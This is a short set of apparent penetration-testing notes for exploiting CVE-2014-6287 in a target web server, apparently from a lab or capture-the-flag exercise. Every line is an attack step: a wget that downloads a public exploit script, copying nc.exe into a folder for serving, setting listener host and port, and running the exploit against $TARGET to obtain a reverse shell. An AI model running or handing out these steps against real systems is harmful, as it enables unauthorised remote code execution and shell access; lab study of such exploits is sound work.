```
wget https://gist.githubusercontent.com/AfroThundr3007730/834858b381634de8417f301620a2ccf9/raw/783473905951169e49afaf5958e89b23f5a8743f/cve-2014-6287.py
```
```
mkdir bin && cp /usr/share/windows-resources/binaries/nc.exe ./bin
```
[[Python#Server]]
Update lhost and lport variables.
[[1._rlwrap]]
```
python cve-2014-6287.py $TARGET 9505
```